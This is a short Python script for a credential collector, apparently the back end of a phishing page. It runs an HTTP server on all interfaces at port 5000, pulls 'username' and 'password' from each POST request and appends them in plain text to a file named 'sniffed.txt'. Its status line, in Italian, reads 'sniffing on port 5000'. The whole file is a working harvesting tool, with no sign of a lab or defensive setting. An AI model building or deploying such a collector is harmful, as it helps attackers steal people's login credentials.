from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class SnifferHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        raw_data = self.rfile.read(content_length).decode('utf-8')
        data = urllib.parse.parse_qs(raw_data)

        username = data.get('username', [''])[0]
        password = data.get('password', [''])[0]

        with open("data/sniffed.txt", "a") as f:
            f.write(f"{username}, {password}\n")


if __name__ == "__main__":
    server_address = ("0.0.0.0", 5000)
    httpd = HTTPServer(server_address, SnifferHandler)
    print("Sniffando sulla porta 5000")
    httpd.serve_forever()
